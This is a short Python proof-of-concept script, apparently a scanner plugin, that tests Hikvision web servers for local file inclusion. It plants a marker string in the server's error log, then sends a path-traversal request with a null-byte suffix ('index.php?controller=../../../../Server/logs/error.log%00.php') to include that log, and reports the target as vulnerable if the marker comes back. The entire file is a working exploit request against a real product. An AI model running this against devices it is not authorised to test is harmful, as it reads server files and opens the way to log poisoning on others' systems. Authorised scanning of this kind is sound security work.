import requests


def audit(target_url: str):
    payloads = "<Venus01>"
    url = target_url + "/" + payloads
    req = requests.get(url=url)

    payload = "index.php?controller=../../../../Server/logs/error.log%00.php"

    lfi_url = target_url + "/" + payload

    try:
        res = requests.get(url=lfi_url)
        if res.status_code == 200:
            if payloads in str(res.content):
                return {
                    "vuln_name": "hikvision local file include",
                    "payload": payload,
                    "msg": "Found Vulnerable",
                    "poc_name": "hikvision_lfi",
                    "vuln_url": lfi_url
                }
            else:
                return {
                    "msg": "Not Found Vulnerable",
                    "poc_name": "hikvision_lfi",
                    "vuln_url": lfi_url
                }
        else:
            return {
                "msg": "Not Found Vulnerable",
                "poc_name": "hikvision_lfi",
                "vuln_url": lfi_url
            }
    except:
        pass
